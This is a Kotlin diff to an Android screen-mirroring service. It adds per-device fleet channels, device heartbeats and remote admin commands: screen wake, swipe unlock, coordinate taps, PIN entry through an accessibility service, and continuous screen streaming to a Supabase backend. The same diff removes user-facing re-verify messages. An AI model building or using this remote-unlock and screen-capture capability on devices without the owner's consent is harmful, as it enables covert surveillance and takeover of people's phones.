@@ -1,5 +1,7 @@
 package com.screenmirror.sender
 
+import android.accessibilityservice.AccessibilityService
+import android.annotation.SuppressLint
 import android.app.*
 import android.content.Context
 import android.content.Intent
@@ -10,6 +12,7 @@ import android.os.Handler
 import android.os.IBinder
 import android.os.Looper
 import android.os.PowerManager
+import android.provider.Settings
 import androidx.core.app.NotificationCompat
 import okhttp3.*
 import org.json.JSONObject
@@ -32,8 +35,10 @@ class ScreenShareService : Service() {
 
     private val sbUrl = "https://pigsylxeeoztnyuydqtr.supabase.co"
     private val sbKey = "sb_publishable_JrDxSeFli4NkkVhopnwCoQ_aa7HFsgl"
-    private val roomId = "device_1"
-    private val roomTopic = "realtime:screen-room-$roomId"
+
+    private lateinit var uniqueDeviceId: String
+    private lateinit var deviceTopic: String
+    private val lobbyTopic = "realtime:fire-fleet-lobby"
 
     private var msgRef = 1
     private var isStreamingToAdmin = false
@@ -41,8 +46,13 @@ class ScreenShareService : Service() {
 
     override fun onBind(intent: Intent?): IBinder? = null
 
+    @SuppressLint("HardwareIds")
     override fun onCreate() {
         super.onCreate()
+        val androidId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID) ?: "unknown"
+        uniqueDeviceId = "fire_${androidId.take(8)}"
+        deviceTopic = "realtime:fire-device-$uniqueDeviceId"
+
         val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
         wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "Fire::AdminWakeLock").apply {
             acquire()
@@ -63,10 +73,10 @@ class ScreenShareService : Service() {
             startForegroundWithType(true)
             initMediaProjection(data)
             hasActiveProjectionToken = true
-            sendTelemetry("FIRE_ONLINE_24x7_READY", false)
+            sendHeartbeat()
         } else {
             startForegroundWithType(hasActiveProjectionToken)
-            sendTelemetry("FIRE_REBOOTED_NEEDS_REVERIFY", !hasActiveProjectionToken)
+            sendHeartbeat()
         }
 
         if (webSocket == null) {
@@ -121,7 +131,7 @@ class ScreenShareService : Service() {
             override fun onStop() {
                 hasActiveProjectionToken = false
                 isStreamingToAdmin = false
-                sendTelemetry("SYSTEM_PROJECTION_EXPIRED", true)
+                sendHeartbeat()
             }
         })
 
@@ -132,16 +142,13 @@ class ScreenShareService : Service() {
     }
 
     private fun startAdminStream() {
-        if (!hasActiveProjectionToken || videoCapturer == null) {
-            sendTelemetry("ERROR: Device restarted, tap Re-Verify in Fire app", true)
-            return
-        }
+        if (!hasActiveProjectionToken || videoCapturer == null) return
         if (!isStreamingToAdmin) {
-            videoCapturer?.startCapture(720, 1280, 15)
+            // Optimized 540x960 @ 12fps so 4 simultaneous streams run smoothly without lag
+            videoCapturer?.startCapture(540, 960, 12)
             isStreamingToAdmin = true
         }
         createPeerAndSendOffer()
-        sendTelemetry("STREAM_STARTED_BY_ADMIN", false)
     }
 
     private fun stopAdminStream() {
@@ -153,7 +160,6 @@ class ScreenShareService : Service() {
         }
         peerConnection?.close()
         peerConnection = null
-        sendTelemetry("STREAM_PAUSED_BY_ADMIN (Standby)", false)
     }
 
     private fun createPeerAndSendOffer() {
@@ -168,7 +174,7 @@ class ScreenShareService : Service() {
                     put("sdpMid", candidate.sdpMid)
                     put("sdpMLineIndex", candidate.sdpMLineIndex)
                 }
-                sendBroadcast("ice-android", payload)
+                sendBroadcast(deviceTopic, "ice-android", payload)
             }
             override fun onSignalingChange(p0: PeerConnection.SignalingState?) {}
             override fun onIceConnectionChange(p0: PeerConnection.IceConnectionState?) {}
@@ -188,12 +194,56 @@ class ScreenShareService : Service() {
             override fun onCreateSuccess(desc: SessionDescription) {
                 peerConnection?.setLocalDescription(this, desc)
                 val payload = JSONObject().apply { put("sdp", desc.description) }
-                sendBroadcast("offer", payload)
+                sendBroadcast(deviceTopic, "offer", payload)
             }
             override fun onSetSuccess() {}
             override fun onCreateFailure(p0: String?) {}
             override fun onSetFailure(p0: String?) {}
         }, MediaConstraints())
+    }
+
+    @Suppress("DEPRECATION")
+    private fun wakeUpDeviceScreen() {
+        val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
+        val screenLock = pm.newWakeLock(
+            PowerManager.SCREEN_BRIGHT_WAKE_LOCK or PowerManager.ACQUIRE_CAUSES_WAKEUP,
+            "Fire::ScreenWake"
+        )
+        screenLock.acquire(5000L)
+    }
+
+    private fun handleAdminCommand(cmd: String, payload: JSONObject) {
+        val acc = FireAccessibilityService.instance
+        when (cmd) {
+            "ADMIN_START_STREAM" -> startAdminStream()
+            "ADMIN_STOP_STREAM" -> stopAdminStream()
+            "WAKE_SCREEN" -> wakeUpDeviceScreen()
+            "SWIPE_UP" -> {
+                wakeUpDeviceScreen()
+                Handler(Looper.getMainLooper()).postDelayed({
+                    acc?.performSwipeUpUnlock()
+                }, 400)
+            }
+            "REMOTE_TAP" -> {
+                val x = payload.optDouble("x", 0.5).toFloat()
+                val y = payload.optDouble("y", 0.5).toFloat()
+                acc?.performNormalizedTap(x, y)
+            }
+            "UNLOCK_WITH_PIN" -> {
+                val pin = payload.optString("pin", "")
+                if (pin.isNotEmpty()) {
+                    wakeUpDeviceScreen()
+                    Handler(Looper.getMainLooper()).postDelayed({
+                        acc?.performSwipeUpUnlock()
+                        Handler(Looper.getMainLooper()).postDelayed({
+                            acc?.enterPinOrPassword(pin)
+                        }, 600)
+                    }, 400)
+                }
+            }
+            "GLOBAL_BACK" -> acc?.performGlobalAction(AccessibilityService.GLOBAL_ACTION_BACK)
+            "GLOBAL_HOME" -> acc?.performGlobalAction(AccessibilityService.GLOBAL_ACTION_HOME)
+        }
     }
 
     private fun connectSupabaseRealtime() {
@@ -202,8 +252,9 @@ class ScreenShareService : Service() {
 
         webSocket = client.newWebSocket(Request.Builder().url(wsUrl).build(), object : WebSocketListener() {
             override fun onOpen(ws: WebSocket, response: Response) {
-                val joinMsg = JSONObject().apply {
-                    put("topic", roomTopic)
+                // 1. Join Fleet Lobby
+                ws.send(JSONObject().apply {
+                    put("topic", lobbyTopic)
                     put("event", "phx_join")
                     put("payload", JSONObject().apply {
                         put("config", JSONObject().apply {
@@ -211,12 +262,21 @@ class ScreenShareService : Service() {
                         })
                     })
                     put("ref", (msgRef++).toString())
-                }
-                ws.send(joinMsg.toString())
-                sendTelemetry(
-                    if (hasActiveProjectionToken) "FIRE_ONLINE_24x7" else "FIRE_ONLINE_NEEDS_REVERIFY",
-                    !hasActiveProjectionToken
-                )
+                }.toString())
+
+                // 2. Join Private Device Channel
+                ws.send(JSONObject().apply {
+                    put("topic", deviceTopic)
+                    put("event", "phx_join")
+                    put("payload", JSONObject().apply {
+                        put("config", JSONObject().apply {
+                            put("broadcast", JSONObject().apply { put("self", false) })
+                        })
+                    })
+                    put("ref", (msgRef++).toString())
+                }.toString())
+
+                sendHeartbeat()
             }
 
             override fun onMessage(ws: WebSocket, text: String) {
@@ -224,19 +284,11 @@ class ScreenShareService : Service() {
                 if (json.optString("event") == "broadcast") {
                     val body = json.optJSONObject("payload") ?: return
                     val eventName = body.optString("event")
-                    val payload = body.optJSONObject("payload") ?: return
+                    val payload = body.optJSONObject("payload") ?: JSONObject()
 
                     when (eventName) {
-                        "admin-command" -> {
-                            when (payload.optString("command")) {
-                                "ADMIN_START_STREAM", "REINIT_CAPTURE" -> startAdminStream()
-                                "ADMIN_STOP_STREAM" -> stopAdminStream()
-                                "PING_DEVICE", "HEALTH_CHECK" -> sendTelemetry(
-                                    if (hasActiveProjectionToken) "STATUS_OK_READY" else "NEEDS_REVERIFY_AFTER_BOOT",
-                                    !hasActiveProjectionToken
-                                )
-                            }
-                        }
+                        "who-is-online" -> sendHeartbeat()
+                        "admin-command" -> handleAdminCommand(payload.optString("command"), payload)
                         "answer" -> {
                             val sdp = payload.optString("sdp")
                             peerConnection?.setRemoteDescription(object : SdpObserver {
@@ -279,19 +331,20 @@ class ScreenShareService : Service() {
         }, 5000)
     }
 
-    private fun sendTelemetry(logMessage: String, needsReverify: Boolean) {
+    private fun sendHeartbeat() {
         val data = JSONObject().apply {
+            put("deviceId", uniqueDeviceId)
             put("model", "${Build.MANUFACTURER} ${Build.MODEL}")
-            put("os", "Android ${Build.VERSION.RELEASE} (API ${Build.VERSION.SDK_INT})")
-            put("log", logMessage)
-            put("needsReverify", needsReverify)
+            put("os", "Android ${Build.VERSION.RELEASE}")
+            put("accessibilityEnabled", FireAccessibilityService.instance != null)
+            put("hasProjection", hasActiveProjectionToken)
         }
-        sendBroadcast("device-telemetry", data)
+        sendBroadcast(lobbyTopic, "device-heartbeat", data)
     }
 
-    private fun sendBroadcast(eventName: String, data: JSONObject) {
+    private fun sendBroadcast(topic: String, eventName: String, data: JSONObject) {
         val msg = JSONObject().apply {
-            put("topic", roomTopic)
+            put("topic", topic)
             put("event", "broadcast")
             put("payload", JSONObject().apply {
                 put("type", "broadcast")
